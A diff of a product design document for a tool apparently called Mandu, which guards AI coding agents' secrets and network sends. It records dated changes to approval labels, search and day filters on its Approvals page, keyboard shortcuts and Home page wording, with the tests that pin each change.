-with its limit grown, starting over), `read-gate.test.ts` (the entry), and
+with its limit grown, starting over), `home-js-rule-change-seek.test.ts`
+(jsdom: a link to the 30th of 45 rule changes reads once more, draws 40 and
+marks it, the poll keeps them; an id that is nowhere keeps today's note),
+`read-gate.test.ts` (the entry), and
 `tests/stack/approvals-answered-more.test.ts` (a real arbiter and the
 net-proxy on its production client, 45 answered asks: 20 drawn, Show more
 brings 21-40 with their reversals, the 30th's *Block instead* over the real
 route, and no value or token on the route signed out, nor more than
 `/api/home` carries).
+
+**The allow that reverses a Block names its scope (2026-10-27).** Until
+2026-10-27 the reversal on a blocked answer read **Allow instead**. It posts
+`…/approve` (the server's reversal carries no `scope`), a standing allow,
+the card's *Always allow*; next to the card's *Allow once* a bare "Allow"
+read as the smaller of the two, and the reader learned it stood only from
+the row's new "Always allowed". It now reads **Always allow instead**
+(home.js `drawAnswered`), with the same route, scope and place. *Block
+instead* stays: the card's *Block* is already standing with no "Always".
+A held message's session answer keeps *Send masked instead* / *Send as
+written instead*. The words are the product page's own: the server's
+label (`policy-panel.ts`), which the developer view draws, stays "Allow
+instead". Tests:
+`home-js-approvals.test.ts` (the label on each kind of answered row and
+the route each posts) and `tests/stack/approvals-answered-find.test.ts`
+(F3: pressed on the served page over the real route, the row then reads
+"Always allowed").
+
+*Kept for one session or one use (2026-10-28, #226).* Until then the
+label was *Always allow instead* on every blocked row, including those
+whose `…/approve` the arbiter keeps narrower (its `resolveEgressApproval`
+scope, arbiter `ipc/server.ts`), and a program's send answered *Allow this
+session* read "Always allowed" here and on the session page, while Rules
+said "a program in one session sending data from …". The page now names
+each allow by what the arbiter keeps it as, through one pure mirror of
+that rule, `allowKeptAs(subject)` in `policy-panel.ts`:
+
+| The row | `allowKeptAs` | The reversal of a Block | An allow reads |
+|---|---|---|---|
+| a program's send of the files it holds, keyed to a session (`holder-send:` with `session`) | `session` | **Allow this session instead** | **Allowed for this session** |
+| the same keyed to no session | `once` | **Allow once instead** | Allowed once, unused / Allowed once |
+| one run of a program (`open:` / `write:` … `#run:`) | `once` | **Allow once instead** | Allowed once, unused / Allowed once |
+| a HIGH session's ask (`session-net:` / `session-exec:`) | `once` | none (no reversal) | Allowed once … |
+| everything else | `always` | **Always allow instead** | Always allowed |
+
+The server sends it: `HomeAnswered.allowKeptAs` (`session` / `once`) on a
+row whose reversal allows and is kept narrower, absent otherwise (§4.30
+*Payload budgets*), and `answeredOutcome` gives `allowed-session` for an
+approved, standing holder row keyed to a session (home.ts; the session
+page's `answers` map uses the same function). home.js `drawAnswered`
+picks the words (`ALLOW_INSTEAD`), and draws `allowed-session` as an
+allow (the check, the `ok` tone) that Rules keeps (*Kept in Rules*, on
+the session page's step too). Same routes, same POST bodies, same rows:
+only words change; the waiting card's answers and the developer view's
+labels are untouched. The mirror can drift if the arbiter's rule changes:
+`tests/stack/approvals-answered-scope.test.ts` files the three kinds of
+question through the real arbiter, presses each reversal over the real
+route and checks the scope the arbiter recorded against the words.
+
+*One line in its button (2026-11-02, #258).* The reversal stays one line
+inside its button at every width. Until 2026-11-02 its column was a fixed
+110 px, which left 86 px for the words, so on a wide window "Always allow
+instead" wrapped to two lines and "Allow this session instead" to three,
+and "instead" was drawn across and below the button's bottom edge. The
+column is now `minmax(var(--reversal-floor, 110px), max-content)` and the
+button `white-space: nowrap` (app.css `.row.answered`). Answered earlier
+sets the floor to 180 px, which fits its longest label ("Allow this session
+instead", 178 px in the page's 13 px Plex Sans), so the outcome starts at
+the same x on every row. The words column gives up the 70 px. A wider label
+or another font widens the column rather than wrapping. Rule changes keeps
+110 px for its Undo, and a phone's single column is unchanged. Tests:
+`home-js-approvals.test.ts` (the served CSS: no fixed 110 px, the floor,
+the nowrap) and `tests/stack/answered-reversal-fits.test.ts` (real
+Chromium over a real arbiter and the production adapter, a key's send and
+a session's program send answered Block: at 1280, 900 and 375 px each
+button is one line inside its border and its row, every label set on it
+too, the words column gives up only the difference, and no value or token
+is on the page).
+
+*And on Rules › Your answers (2026-10-31, #232).* Rules, the third place
+that draws the same answers, still said "Always allowed" / "Always
+blocked" on every answer row, under a holder row's own reach line "a
+program in one session sending data from …". Its effect menu offered
+"Always allowed" on any blocked row, and the notice after a flip said
+"Now always allowed." The policy panel's answered rows now carry the same
+mirror (`QueueRowVM.allowKeptAs`, `session` / `once`, absent for a
+standing allow and on a waiting row; `toQueueRow` in `policy-panel.ts`),
+and home.js `answerEffectWords` names a row by it:
+
+| The row | Its effect | Its flip's other option | The notice after the flip |
+|---|---|---|---|
+| a holder send keyed to a session | **Allowed for this session** / **Blocked for this session** | the other of the two | "Now allowed for this session." / "Now blocked for this session." |
+| a holder send keyed to no session, or one run of a program | Always allowed / Always blocked (only a standing row reaches Rules) | **Allowed once** / **Blocked once** | "Now allowed once: your agent's next try goes through, then Mandu asks again. It is listed under Approvals › Answered earlier." (the last words link the answer's row there) |
+| everything else | Always allowed / Always blocked | the other of the two | "Now always allowed." / "Now always blocked." |
+
+A Block on a holder row keyed to a session is kept on that session's row,
+as its allow is, so Rules says "Blocked for this session". Approvals keeps
+its plain "Blocked" (`answerLabel`): there the row's sentence names the
+session. The arbiter keeps an answer on a once kind as once, Allow or
+Block alike, and Rules lists standing answers only (it skips `scope:
+once`). A once-kind row reaches Rules only if it was kept standing before
+plan 13 §8 decision (c). Its once flip and notice are a defensive branch:
+the answer leaves Rules, so the notice says where it is now. Same routes,
+same POST bodies, same rows: only words change. Find a rule matches the
+new words ("this session"). Tests: `policy-panel.test.ts` (the field on
+each kind), `home-js-rules.test.ts` (the effect, the flip, each notice and
+its link), and the Rules half of
+`tests/stack/approvals-answered-scope.test.ts`. That half blocks a second
+send of the session, reads both rows on the served Rules page, and turns
+the blocked one around from its menu over the real route. It checks the
+notice, then the `always` the arbiter recorded on the session's row.
 
 **Finding an answer (2026-10-22).** *Answered earlier* is the only place
 that undoes most past answers, and it could only be paged: someone who
@@ -5220,8 +6201,8 @@ search, as History's is.
   `answeredMatches` in `view-model/home.ts`, pure, over `answeredRowWords`,
   the row's sentence (the agent, the secret's name or its file as `~/…`,
   the host, the program) and its outcome in the words the row draws
-  (`ANSWERED_OUTCOME_WORDS`: "Blocked", "Always allowed", "Allowed once",
-  …; home.js `answerLabel` draws the same, pinned by a test), plus "No
+  (`ANSWERED_OUTCOME_WORDS`: "Blocked", "Always allowed", "Allowed for
+  this session", "Allowed once", …; home.js `answerLabel` draws the same, pinned by a test), plus "No
   longer applies" and why for an answer that no longer does. So
   "stripe_key blocked" finds the blocked sends of that key, and "allowed
   once" the answers listed nowhere else.
@@ -5237,7 +6218,9 @@ search, as History's is.
   match."; none found reads "No answer matches “pastebin”." with **Clear**,
   which empties the box and the address, lists the newest 20 again and
   focuses the box. Escape in the box does the same (`plainEscape`, only
-  with words in it).
+  with words in it). None found, the status line says that sentence too,
+  to a screen reader only, as History's does (§4.25ae *Finding a session*;
+  until 2026-10-29 the line went silent on no match).
 - The search lives in the address, `/approvals?q=stripe` (replaced as you
   type): a reload and Back keep it, a link to Approvals starts without one.
   An address that opens one answer (`/approvals/<id>`, `markApprovalsAsk`)
@@ -5248,6 +6231,9 @@ search, as History's is.
   drawn (`followAnswered` with the same `q`, as `followHistory` does), and
   not while a new search's first read is out, whose answer it would
   otherwise overtake.
+- Beside the box sits **Go to a day** (2026-11-04), History's date box:
+  the answers from a day back, and a search holds with it (*Go to a day on
+  Answered earlier*, below *Answers sit under their day*).
 
 *Why the match never reads an original.* The route is `open` signed out,
 as History's is, and a search answers one bit per query: had it matched
@@ -5256,8 +6242,8 @@ about `sk_live_…`. It matches only the words the row already serves,
 built from what the queue row names, never a value, and each masked item
 in a sentence (a command's placeholder) is spelled "[masked]", so neither
 a value nor its placeholder's own words find anything. It changes no
-verdict and no reversal route: *Allow instead* on a found row is the same
-`POST /api/egress/approvals/<id>/approve`.
+verdict and no reversal route: *Always allow instead* on a found row is the
+same `POST /api/egress/approvals/<id>/approve`.
 
 Tests: unit `view-model/answered-find.test.ts` (the secret, the file, the
 host, the agent and the answer's words; every word; a masked item never
@@ -5271,8 +6257,247 @@ answer, each outcome drawn in the words the server searches), and
 `tests/stack/approvals-answered-find.test.ts` (a real arbiter and the
 net-proxy on its production client, 25 blocked sends to two hosts: a
 search for one host lists its 12, "12 of 25 answers match" on the served
-page, *Allow instead* on a found row over the real route, and a search
+page, *Always allow instead* on a found row over the real route, the row
+then "Always allowed", and a search
 for a value or a token finds nothing).
+
+**Finding a rule change (2026-10-26).** *Rule changes* is where every rule
+change can be undone, and after *Finding an answer* it was the last long
+product list with no search: someone who wants to undo "the change that
+let Claude Code send to `api.stripe.com`" last week pressed *Show more*
+(20 at a time) and read every row, up to 500. Rule changes pile up fast:
+every Always allow, every Save in Rules or Settings, every Describe Apply,
+every change an agent made or asked for. Above its rows is now **Find a
+change** (`<form id="changes-search" role="search">`, `#changes-q`,
+placeholder "A file, a host or the agent", the classes of *Find an
+answer*), hidden while there is no change and no search.
+
+- It keeps the changes whose words hold every word typed, case aside
+  (home.js `foundChanges` over `changeSearchWords`): the sentence as the
+  row draws it (with the agent Home names for its session, `namedSentence`
+  / `changeAsker`), that agent and its folder as `~/…`, each part of the
+  rows the server sent (the file as `~/…`, the host, the program, the
+  level), and "Undone" for an undone change; never a moment. So "stripe"
+  finds the changes that name `api.stripe.com`, "claude shop" the ones
+  Claude Code in `~/shop` made, "undone" the ones taken back.
+- The page matches, not the server: no route changes. The first search of
+  a visit reads `policy/changes?limit=500` (`CHANGES_MAX`, where the
+  route stops), as a link to an older change does (`seekChanges`); the
+  keys after it match that read, never read again. While a search is on
+  the poll reads the same 500, and `sameAsDrawn('rule-history', …)` is
+  keyed with the search words (`ruleHistoryKey`), so a poll that brings
+  the same read draws nothing again (the focus stays in the box) and one
+  that brings a change, an Undo included, draws the matches again.
+- It matches once the typing stops (250 ms, as *Find an answer*), or at
+  once on Enter, and draws only the list. A status line counts "3 of 41
+  changes match", "3 of the newest 500 changes match" when the read
+  stopped at 500 (the route says no total past it); the newest 20 matches
+  are drawn, and *Show more* ("Showing 20 of 34 changes that match.")
+  draws 20 more from the read kept. None found reads "No change matches
+  “pastebin”." with **Clear**, which empties the box and the address and
+  lists the newest 20 again, with no read, and focuses the box; Escape in
+  the box does the same (`plainEscape`, only with words in it). None
+  found, the status line says that sentence too, to a screen reader only,
+  as History's does (§4.25ae *Finding a session*; until 2026-10-29 the
+  line went silent on no match). It is written only when its words
+  change: a poll that brings a new change and still finds none says
+  nothing again.
+- The search lives in the address as `?changes=<words>` (replaced, not
+  pushed), beside *Find an answer*'s `?q=`: a reload, Back and a typed
+  address keep it, a link to Approvals starts without one. A link to one
+  change (`/approvals/<pc-…>`) has none, so the row it marks is never
+  filtered out; typing a search there drops the change from the address
+  with its mark.
+- Beside the box sits **Go to a day** since 2026-11-04 (*Go to a day on
+  Rule changes*, under *Changes sit under their day*): a search and a day
+  hold together, the matches from that day back ("3 of 41 changes match,
+  from Tuesday, Oct 20 back"), cut on the page over the same read of the
+  newest 500.
+- **A file rule opens it searched for that file** (2026-10-29). Under an
+  opened file rule on Rules whose origin line links its change (§4.25i
+  *The line links its change*), **Find its changes** follows it: a plain
+  link to `/approvals?changes=<path>#rule-changes`, the path as a change
+  row names it (`~/…`, `shortPath`: a row drawn under its folder as `.env`
+  searches `~/app/.env`), named by its rule ("Find its changes:
+  ~/app/.env"). It is the one link that carries this search: its
+  `data-land` "changes:<words>" sets the search on the pushed page
+  (`setPage`, as "q:<words>" does for *Find an answer*), and the page
+  lands at *Rule changes* (`landAtCard`, the focus on its heading); every
+  other link still opens the search empty. Back returns to Rules where you
+  were. The words say "its changes", not "every change": the search
+  matches words, so `~/app/.env` finds a change to `~/app/.env.local`
+  too, and a hand edit made while Mandu was not running was never
+  recorded.
+- **A send or connection rule opens it searched for its host**
+  (2026-10-31). The same link is under an opened *Sending data* rule to
+  one host and an opened *Programs and connections* connection rule
+  (`changeFindTerm`), named by its row ("Find its changes: pastebin.com",
+  "Find its changes: pypi.org:443"). A send rule searches its destination
+  as the row writes it, which is the host its `release` change row names
+  (`pastebin.com`), so the search also finds the host blocked, undone, or
+  added to a file. A connection rule searches its **host alone**
+  (`/approvals?changes=pypi.org#rule-changes`): an agent's
+  `allow-connect` usually names no port, so its change row reads
+  `pypi.org` while Rules shows the port it got (`pypi.org:443`), and the
+  search matches words, so `pypi.org` finds both forms (and, as for paths,
+  a longer host such as `pypi.org.example`). A port of `*` ("on any port")
+  searches the host too. No link where no one name is right: a send to
+  anywhere, a send to several hosts (`a.com, b.com`), a connection to any
+  address, a program (`app:`) rule, a built-in protection, a source, and
+  your answers (their origin is a question, not a recorded change). A send
+  rule written to a list (`@uploads`) shows the list's host on Rules while
+  its change row names the list, so the search finds that host's other
+  changes but not that one; *See this change in Approvals* still opens it.
+- Undo and the agent link work on a found row as on any row; it is the
+  same `POST /api/policy/changes/<id>/undo`. Presentation only: no
+  route, no policy and no Undo semantics change, and the words matched
+  are those the row already draws (the server's rows never carry a value
+  nor a `$MDU:` code).
+
+Tests: jsdom `home-js-rule-changes-find.test.ts` (no box with no change;
+"stripe" keeps the rows naming the host after one read of 500 and none
+after it, the count, `?changes=` replaced, the focus kept, two words both
+matching; the agent Home names and its folder; "undone"; none found,
+Clear and Escape back to the newest 20 with no read; `?changes=` on load
+beside `?q=`, a link starting without it, `/approvals/<pc-…>` with none
+and a search dropping it, "of the newest 500"; a poll with the same read
+drawing nothing again; Undo on a found row; Show more of the matches with
+no read), and `tests/stack/rule-changes-find.test.ts` (a real arbiter and
+dashboard in a real Chromium, `secrets`: three changes over the real
+routes, one host typed leaves its one row, "1 of 3 changes matches", Undo
+on it over the real route, and no value nor token in the count line, the
+found rows or the page). *Find its changes* on a send or connection rule:
+jsdom F12 in the same file (a send to one host, a connection searched for
+its host alone so a portless change is found, none for anywhere, two
+hosts, any address, a built-in protection, a program or no record), and
+O6 in `tests/stack/rule-origin-change-link.test.ts` (an agent's send rule
+and its portless connection, approved over the real route, each find
+their change).
+
+**`/` finds (2026-10-31, #220).** The four Find boxes took a click or a
+run of Tabs through the top bar and the section links, and in Firefox `/`
+opened the browser's own quick find, which cannot search what the server
+holds (History's sessions, the answers past those drawn). Now a plain `/`
+puts the cursor in the page's box with its text selected, to be typed
+over: on History *Find a session* (`#history-q`), on Approvals *Find an
+answer* (`#answered-q`), or *Find a change* (`#changes-q`) while *Answered
+earlier*'s form is hidden, and on Rules *Find a rule* (`#rules-find`,
+§4.25f). One `keydown` listener on `document` (home.js `slashFinds`,
+wired first in `boot()`) calls `preventDefault` only when it moves the
+focus, so no `/` lands in the box. Everywhere else the browser keeps its
+own `/`: with the focus in any `input`, a `textarea`, a `select` or
+editable text (Describe, a rule's menu, *Go to a day*, the typeahead
+menus), with Ctrl, Alt or Meta held (Shift is allowed: some keyboards type
+`/` with it), on Home, the session page (which keeps the browser's Find,
+§4.25b) and Scan (whose *Find one* boxes are several), and while the
+page's box is hidden: the box, its form or its block carries `hidden`
+(*An empty History has nothing to find*, Approvals' forms with nothing to
+find, *An empty Your rules has nothing to find*). Each box says so with
+`aria-keyshortcuts="/"`, named by a screen reader, and the title "Press /
+to come back here."; the look does not change (no key chip). Tests: jsdom
+`home-js-slash-find.test.ts` (each page's box focused and selected, the key
+prevented; Approvals with no answer going to *Find a change*; left alone on
+Home, with each page's box hidden, in Describe, a menu, a date box and
+editable text, and with each modifier; the attributes) and
+`tests/stack/history-search.test.ts` (on the served `/history`, `/` then
+typing runs the real server search).
+
+**Changes sit under their day (2026-10-28).** *Rule changes* was one flat
+run of rows, the day of each only in its small dim time line ("Oct 25,
+10:31 · 2 hours ago"), so "what did my agent change yesterday?" meant
+reading every row's time, and a screen reader had no heading to go from
+day to day. Now it draws the heading *Answered earlier* draws (§4.34
+*Answers sit under their day*; the words and the midnight rule are
+History's, §4.25ae *Sessions sit under their day*): "Today",
+"Yesterday", "Friday, Jul 10" (with the year when it is not this year),
+`historyDay` with the tag `h3` under the section's `h2` "Rule changes",
+the `.history-day` look, before the first row of each local day a change
+was made (`createdAt`). `drawRuleHistory` draws every row it holds at
+once, so a Show more that continues the last day adds no second heading
+and its first row (not a heading) takes the focus; a *Find a change*
+result is grouped the same way (a day with no match has no heading), and
+"No change matches" has none. A change with no time starts no day. The
+*patterns hidden* note stays first, above the first heading. The row's
+own time line, its Undo, its *Undone* and the agent link stay as they
+are. The heading carries no `data-id` nor `data-proposal` and is not a
+`.row`, so the lists of rows (`drawnCards`, `putBackAnswers`, the focus
+after Show more) and the mark of a linked change (`ruleChangeRow`,
+`markApprovalsAsk`, `seekChanges`) pass it by. `refreshWhen` says its
+words again on every poll, so past midnight "Today" reads "Yesterday".
+Nothing new is served; what a change does and its Undo are unchanged.
+Tests: unit `home-js-rule-changes-days.test.ts` (a fixed clock in Seoul:
+today, yesterday and an older day once each in order, two changes of a
+day under one heading, a change with no time, the patterns note first,
+Show more on the same and on a new day with the focus on the row, a Find
+result, Undo on a row under a heading, a linked change marking its row,
+midnight), stack `tests/stack/always-source-answer-line.test.ts` (a
+real arbiter and `DashboardServer`, the served page: after the last
+Always, the change it made sits under Today).
+
+**Go to a day on Rule changes** (2026-11-04). Rule changes is where a
+person finds what changed their rules and undoes it ("what did the agent
+loosen on Tuesday?"), but it reached past its newest 20 only by Show
+more, and *Finding a rule change* helps only when a file, a host or the
+agent is remembered. Answered earlier, the section above it, has had *Go
+to a day* since the same day (§4.25 *Go to a day on Answered earlier*),
+and History since 2026-10-29 (§4.25ae *Go to a day*); now the two lists
+of the past on Approvals page back alike. Beside *Find a change*, in
+`#changes-search`, sits the same labelled native date box, **Go to a
+day** (`#changes-day`, in `.history-go-day`, so the two sections wrap the
+same way; today its latest day, no earliest), and **Show the newest**
+(`#changes-newest`) beside it while a day is set, outside the status line
+`#changes-count`, a live region. Those two paragraphs hold the shared
+rules: the bound is the start of the day after the chosen one as the
+browser reckons it (`historyDayEnd`); the day lives in the address,
+`/approvals?cday=2026-10-20` (`cday`, beside Answered earlier's `day=`,
+after `changes=`; replaced, not pushed), so a reload, Back and a typed
+address keep it, a link to Approvals starts at the newest, a `cday=` that
+is not a real date is none (`historyDayParam`), and an address that opens
+one change (`/approvals/<pc-…>`) has none, as it has no search, so its
+marked row is listed; choosing a day there drops the change with its mark.
+
+- *Which moment.* When the change was made (`createdAt`), the moment its
+  day heading comes from: the list is the changes made before the bound,
+  newest first, so the first heading is the chosen day, or the nearest
+  earlier day with a change. A change with no time is kept, at the end,
+  as History keeps a session with none (`changesFromDay`).
+- *The page cuts, over the newest 500.* No route changes: with a day the
+  page reads what a search reads, `policy/changes?limit=500`
+  (`CHANGES_MAX`; `changesFinding` in `loadRuleHistory`), and keeps the
+  changes before the bound, then the search's matches among them
+  (`changesFound`). The poll reads the same 500, and the day is in
+  `ruleHistoryKey`, so a poll with the same read draws nothing again.
+  Show more draws the next 20 from the read kept ("Showing 20 of 27
+  changes from Tuesday, Oct 20 back.").
+- *What the status line says.* Where the list starts: "From Tuesday, Oct
+  20 back" ("From yesterday back"); with a search, "3 of 41 changes match,
+  from Tuesday, Oct 20 back". When the read held the newest 500, the
+  route says no total past them, so the line says the cut was made there:
+  "From Tuesday, Oct 20 back, of the newest 500 changes". Nothing on or
+  before the day reads "No rule changed on or before Tuesday, Oct 20."
+  ("None of the newest 500 changes was made on or before …" over a read
+  held at 500, so it never claims nothing older exists; with a search,
+  "No change matches “x” on or before …") with Show the newest, said to a
+  screen reader by the status line as a search that finds none is. Show
+  the newest, or clearing the box, empties the day, the address and the
+  line, keeps the search, and focuses the box.
+- Nothing about what a change does, or its Undo, changes: presentation and
+  paging only.
+
+Tests: jsdom `home-js-changes-day.test.ts` (changes on three days and one
+with no time: the box and its label, the middle day's heading first and no
+newer row, the read of 500, `cday=` replaced in the address, the line,
+Show more back to the older day and the change with no time last, a poll
+that draws nothing again, Show the newest, a search and a day together, a
+day before every change with and without a search, a read held at 500,
+`?cday=` on load, Back, a link, a bad date, Answered earlier's own `day=`,
+a change the address opens), stack `tests/stack/changes-day.test.ts` (a
+real arbiter at `secrets` and the dashboard in Chromium, two changes made
+over the real routes: yesterday says no rule changed on or before it,
+with Show the newest; today lists both under Today; the address carries
+the day and a reload keeps it; no value or token). The change ledger
+stamps changes with the arbiter's own clock, so the middle of three days
+is the jsdom suite's case.
 
 **The pages** (`public/index.html` + `app.css` + `js/home.js`, no framework,
 every server string inserted as text):
@@ -5280,7 +6505,12 @@ every server string inserted as text):
 1. **Home** — the hero (icon, headline, sentence, only the non-zero count
    facts); while the newest launch left the agent's programs able to read
    the credential files, the amber secret posture card under it (§4.23
-   *Product page*, after §4.25x's exposure card); *Approvals waiting (N)* (N = the nav badge; the first three asks
+   *Product page*, after §4.25x's exposure card and §4.25x1's route card,
+   shown while an attached OpenClaw Gateway's config no longer routes
+   through Mandu); the amber warning cards at the top (a security update,
+   an edit to policy.yaml Mandu refused, places in Mandu's folder others can
+   open, §4.25q *Home warns about open places*, the dashboard account
+   changed); *Approvals waiting (N)* (N = the nav badge; the first three asks
    with Allow once / Always allow / Block through the
    `egress/approvals/<id>/{approve-once,approve,deny}` routes, CSRF header as
    everywhere, then "N more questions in Approvals"; with none, "Nothing is
@@ -5294,7 +6524,9 @@ every server string inserted as text):
    agent*); *Earlier in the last 24
    hours* (the window's ended sessions, newest 10, then "N more sessions in
    the last 24 hours"; each row names its folder, as Running now's does,
-   *Agents, not sessions*); and the collapsed *Where your data lives* (§4.25q).
+   *Agents, not sessions*); under them, when a drawn row has a mark or a
+   count, the collapsed *What the counts mean* (*Home's fold*); and the
+   collapsed *Where your data lives* (§4.25q).
    **On a phone the hero's icon sits above its headline** (2026-10-18). At
    640px and narrower (the stylesheet's phone breakpoint) the hero is a
    column: the icon is 40px (its glyph 22px) above the headline, and the
@@ -5322,7 +6554,8 @@ every server string inserted as text):
    only when a row had no counts, so a row that said "2 items masked, 1 send
    blocked" did not say when. Its `lastAt` unknown: no time line, not a bare
    "ended". "Ended" means not running: a recorded exit, or no event for
-   `RUNNING_WINDOW_MS`, as everywhere on the page.
+   `RUNNING_WINDOW_MS` when no live launch of the session remains (§4.10.4
+   *A live launch keeps `R`*), as everywhere on the page.
    **A row reads its counts under its prompt** (2026-10-06). Both lists
    draw a row the same way (home.js `agentRow`): the agent; the prompt on
    one ellipsized line with the counts on the line under it, in the row's
@@ -5424,6 +6657,10 @@ every server string inserted as text):
    lead's title says how a session counts: "Each session active in the
    last 24 hours counts whole, including its steps before then" (`HomeFacts`
    counts a session from its start once its last event is in the window).
+   Since 2026-10-27 (#192) the window's first count, when any, is the
+   sessions that ran with protection off (*A session that ran with
+   protection off says so*), then the masked, early, blocked and sent
+   counts.
    "N waiting for you" moves to the front of the line, before the lead:
    it counts every question pending now, of any age (`window.waiting` is
    the queue's pending rows), not the window's. A window of unknown length
@@ -5459,6 +6696,64 @@ every server string inserted as text):
    `tests/stack/home-waiting-verdict.test.ts` W4 (the served page over a
    question the real gate held: the headline once, the question listed,
    and neither the secret's value nor a token on the page).
+   **An empty window says when Mandu last stepped in** (2026-10-26). The
+   counts cover the last 24 hours, so a person back on Monday after Mandu
+   masked a key or blocked a send on Friday read only "Nothing to count in
+   the last 24 hours.", and Earlier was hidden too: finding Friday's
+   session meant knowing to open History and turn on *Only where Mandu
+   stepped in*. Now, when the window counts nothing (every session in it
+   counted, no secret masked or read early, no untrusted item, nothing
+   blocked, nothing sent, and since 2026-10-27 no session that ran with
+   protection off, which the window counts (*A session that ran with
+   protection off says so*); `windowCountedNothing`, under any verdict but
+   `failed`, `off` and `unknown`), `buildHome` looks through the sessions
+   whose last event is before the window, newest first, at most
+   `HISTORY_SCAN_BUDGET` (200), with the predicate History's switch uses
+   (`steppedIn` over each row as `homeAgentRow` builds it from the cached
+   `HomeFacts`, with the questions it raised that still wait), and sends
+   the first as `lastSteppedIn: { id, agent, cwd, at, counts }`: metadata
+   only, the fields its History row already serves, `at` its last event,
+   and `counts` (2026-10-27) the numbers of that row as `homeAgentRow`
+   built it for the look-through, no extra read (`HomeStepCounts`:
+   `secrets: { masked, early }`, `untrusted`, `blocked`, `sent`,
+   `waiting`, `holds`, `protectionOff`; numbers and booleans only). A
+   session in the window is never named (its counts are the window's).
+   The answer is kept per server while the sessions looked through, their
+   waiting questions and the minute stay the same, so the 10-second poll
+   looks through again at most once a minute (a label made since can
+   change a row's counts). The empty line then goes on: "Nothing to count
+   in the last 24 hours. Mandu last stepped in Fri, Oct 23, 17:40, in
+   Claude Code in `~/projects/shop`: 1 secret masked, 1 action blocked.
+   See every one in History." The words from "Mandu last stepped in" are
+   a link to that session's page (the counts' `countLink`), the moment in
+   the reader's clock with the full date on hover. What follows the colon
+   says what Mandu did there, so a person back on Monday tells a routine
+   masked key from a blocked send without opening the session: exactly
+   the counts line of that session's History row (`stepWords` reuses
+   `rowMarks`, "protection failed", "protection was off" and "less
+   protection than usual" first (`counts.lessProtection`), then
+   `rowCounts`, then "N questions waiting for you", joined with ", "),
+   plain text after the link, so the link's name and title stay as they
+   were. No `counts` (an older server) or none to say: no colon, the
+   sentence as before. "See every one in History" opens History with its
+   switch on. Nothing found, nothing said: with no such session within the
+   budget, a look-through that fails, or an older server, the line is as
+   before; the partly counted and unknown-window lines never get the
+   sentence. Tests: `home-js-home.test.ts` (the sentence and its two
+   links, without a folder, in the `waiting` verdict, absent or malformed,
+   partly counted, unknown hours, a count in the window; the counts after
+   the colon, plurals, "protection failed" leading, a waiting question
+   alone, and no, zero or malformed counts drawing the old sentence byte
+   for byte), `home-last-stepped-in.test.ts` (`buildHome`: absent when the
+   window counted something or nothing older stepped in, the newest older
+   one with its row's `counts`, a question it raised that still waits in
+   them, never one in the window though a waiting question keeps it, the
+   kept answer, reads that fail) and across the real arbiter and proxy
+   `tests/stack/home-last-stepped-in.test.ts` (a session that masked a
+   `.env` 30 hours ago and a plain one 2 hours ago: `/api/home` names the
+   old one with `counts.secrets.masked` 1, the served hero draws the line
+   "…: 1 secret masked." and its links, and neither carries the value nor
+   a token).
    **A busy day** (2026-10-08). `buildHome` models at most the newest
    `HOME_SESSION_CAP` (25) sessions in the window. Until now nothing said
    so: with 31 sessions in the last 24 hours the lead still read "In the
@@ -5503,7 +6798,8 @@ every server string inserted as text):
    session left out may hold it too. The ids are the rows' own, so the
    signed-out read gate is unchanged.
    - **One session holds it:** the link opens that session's page where
-     its tile goes (`/agents/<id>?go=blocked|sent|secrets`, *A tile takes
+     its tile goes (`/agents/<id>?go=blocked|sent|secrets`, AGENT_GO, which
+     also holds a Running now row's `latest`; *A tile takes
      you to what it counts*): the blocked or sent step marked and
      focused, or *Your secrets* for the two secrets' counts. Title "Opens
      the session where it happened.".
@@ -5553,7 +6849,16 @@ every server string inserted as text):
    focus on the switch, as the top bar's words open it) and `rule` with a
    `path` (Rules with the rule that decides that file opened under *Your
    rules*; §4.25p *A sentence names its place as a link*). The sentences: `off` "… Turn it back
-   on in Settings." (the link: "Turn it back on in Settings"), `failed` "…
+   on in Settings." (the link: "Turn it back on in Settings"); `off` with
+   On saved for the next start (2026-10-27, `home.ts savedOn`, from
+   `configuredMode`) "… On is saved and starts when the protection service
+   restarts. Open Settings › Protection." (the link: `protection`, which
+   the top bar's words open too). Until then the hero said "Turn it back
+   on in Settings" right after you had, while the top bar said "· on from
+   the next start" and Rules' banner "still off until the protection
+   service restarts". Its words promise no Restart button: Settings shows
+   one only with the dashboard's service controls. An arbiter that does
+   not answer is "Not connected.", never this case. `failed` "…
    Open the detailed trace to see which.", `unknown` "… Start an agent
    with Mandu, or open Settings.", and the page's own not-running sentence
    "… Start it under Settings, or refresh in a moment." (Settings has the
@@ -5563,8 +6868,10 @@ every server string inserted as text):
    the 503 sentence), `home-counts.test.ts` (the served busy day links the
    failed session's trace) and across the real arbiter
    `tests/stack/home-hero-links.test.ts` (at the `off` axes: `/api/home`'s
-   parts, and the served link opens Settings with its switch; neither a
-   secret's value nor a token on the page).
+   parts, and the served link opens Settings with its switch; a second
+   case with `mode = "secrets"` saved: the new words on Home and Rules,
+   the link opening Settings › Protection; neither a secret's value nor a
+   token on the page).
    **The hero says why in words** (2026-10-10). When `/api/home` cannot
    be read, the page writes the hero itself (`home.js renderHero`). Until
    now it put the failed request's own text in the sentence: `apiGet`'s
@@ -5598,7 +6905,7 @@ every server string inserted as text):
 2. **Approvals** (`/approvals`) — the same asks under *Waiting for your
    answer*, each expanded into three cells (why it stopped · what the AI has
    now · if you click Allow) with a link to the raising session's agent page,
-   then *Answered earlier* with "Allow instead" / "Block instead" and, on
+   then *Answered earlier* with "Always allow instead" / "Block instead" and, on
    each answer's when line, the same link (§4.25h). **Details**:
    each Home card's time line ends with *Details in Approvals* →
    `/approvals/<id>`, the same question in full. Opened for one question (from
@@ -5687,7 +6994,9 @@ every server string inserted as text):
    route, and the served row's link opens the served agent page with the
    exact step marked; the no-value, no-token oracle).
    **A remembered answer opens where Rules keeps it** (2026-10-22). The
-   page says "Always allow and Block are remembered under Rules", and until
+   page says answers that last, "such as Always allow and Block, are kept
+   under Rules, where you can change them" (its intro until 2026-10-27:
+   "Always allow and Block are remembered under Rules"), and until
    then no answered row led there: someone who pressed *Always allow* by
    mistake and wanted to be asked again, not blocked, had to open Rules and
    find the row among every rule, since only Rules forgets an answer
@@ -5715,17 +7024,44 @@ every server string inserted as text):
    `tests/stack/answered-opens-rule.test.ts` (a real Always allow from the
    net-proxy on its production client, Kept in Rules on the served page
    opens the row, Remove there makes the same send wait again; the
-   no-value, no-token oracle).
+   no-value, no-token oracle). Since 2026-10-23 (nightly #101) the session
+   page's step that asked links the same row: its line ends "Your answer:
